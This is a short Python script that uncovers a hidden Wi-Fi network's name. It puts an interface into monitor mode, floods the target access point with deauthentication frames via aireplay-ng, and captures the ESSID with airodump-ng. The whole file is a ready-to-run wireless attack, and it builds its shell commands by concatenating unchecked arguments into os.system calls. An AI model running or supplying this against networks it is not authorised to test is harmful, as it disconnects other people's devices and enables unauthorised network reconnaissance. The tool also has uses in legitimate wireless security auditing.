import os
from subprocess import check_output

#def_interface="wlx002522509005"
#def_mac="C8:1F:BE:B8:39:74"
#def_canal="6"


def find_hidden_essid(interface,mac,canal):
	def execute(cmd):
		os.system(cmd+" > /dev/null 2>&1")

	print "Setting monitor mode and channel..."
	execute("ifconfig "+interface+" down")
	execute("iwconfig "+interface+" mode monitor")
	execute("iwconfig "+interface+" channel "+canal)
	execute("ifconfig "+interface+" up")

	print "Deauthenticating..."
	cmd1="sudo aireplay-ng -0 30 -a "+mac+" "+interface+" "
	execute(cmd1)

	print "Trying to get ESSID... (If it returns <length:, wait or try  again)"
	cmd2="sudo airodump-ng -c "+canal+" --bssid "+mac+" "+interface+" 2>&1 | grep PSK | awk '{print $12}'"
	os.system(cmd2)
	
	
#find_hidden_essid(def_interface,def_mac,def_canal)